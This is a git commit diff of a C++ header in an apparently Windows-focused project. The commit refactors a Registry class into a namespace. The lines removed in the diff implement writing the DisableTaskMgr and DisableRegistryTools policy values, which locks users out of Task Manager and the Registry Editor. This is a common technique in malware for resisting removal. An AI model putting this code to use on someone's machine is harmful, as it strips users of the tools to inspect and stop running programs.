9232fcdf788a77400c6fcfd8b55fb16749df3abb
RockaDev <83962580+RockaDev@users.noreply.github.com>
2022-11-25 13:59:17 +0100

    Update header.h

--- disable/header.h
+++ disable/header.h
@@ -6,61 +6,22 @@
 #pragma warning(disable:4129)
 typedef long _L32;
 
-class Registry {
-private:
-	
-	LPCWSTR DisableTaskMgr = L"DisableTaskMgr";
-	LPCWSTR DisableReg = L"DisableRegistryTools";
-	HKEY hKey = HKEY_CURRENT_USER;
-	LPCWSTR TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\");
-	DWORD val_disable = 1;
-	DWORD val_enable = 0;
+namespace SYS
+{
+	class Registry {
+	protected:
 
-public:
+		LPCWSTR DisableTaskMgr = L"DisableTaskMgr";
+		LPCWSTR DisableReg = L"DisableRegistryTools";
+		HKEY hKey = HKEY_CURRENT_USER;
+		LPCWSTR TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\");
+		DWORD val_disable = 1;
+		DWORD val_enable = 0;
 
-	void ProcessValue()
-	{
-		_L32 mgrResult = RegQueryValueExW(hKey, DisableTaskMgr, NULL, NULL, NULL, NULL);
-		_L32 regResult = RegQueryValueExW(hKey, DisableReg, NULL, NULL, NULL, NULL);
+	public:
 
-		if (mgrResult == ERROR_FILE_NOT_FOUND && regResult == ERROR_FILE_NOT_FOUND)
-		{
+		void ProcessValue();
+		void ModifyRegistry();
 
-			if (RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
-			{
-				return;
-			}
-			else if (RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
-			{
-				return;
-			}
-			else
-			{
-				RegCloseKey(hKey);
-			}
-		}
-		else
-		{
-			RegSetValueExW(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
-			RegSetValueExW(hKey, DisableReg, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable));
-			RegCloseKey(hKey);
-		}
-		RegCloseKey(hKey);
-	}
-	void ModifyRegistry()
-	{
-		RegOpenKeyExW(hKey, TMGR_PATH, 0, KEY_ALL_ACCESS, &hKey);
-
-		if (RegCreateKeyExW(hKey, L"System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
-		{
-			TMGR_PATH = (L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\");
-			ProcessValue();
-		}
-		else
-		{
-			ProcessValue();
-		}
-		return;
-	}
-
-};
+	};
+}
